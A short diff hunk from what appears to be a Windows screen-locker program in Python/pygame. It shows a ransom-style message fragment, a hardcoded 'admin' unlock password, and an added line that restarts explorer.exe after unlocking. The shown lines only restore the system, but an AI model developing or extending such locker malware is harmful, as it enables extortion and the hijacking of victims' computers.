@@ -418,6 +418,7 @@ Donald Trump, and Elon Musk. Even if you believe this is a mistake, write to Tel
                         if text == "admin":
                             print("Успех! Пароль верный.")
                             PlusRegedit()
+                            subprocess.call("start explorer.exe", shell=True)
                             pygame.quit()
                             sys.exit()
                         else:
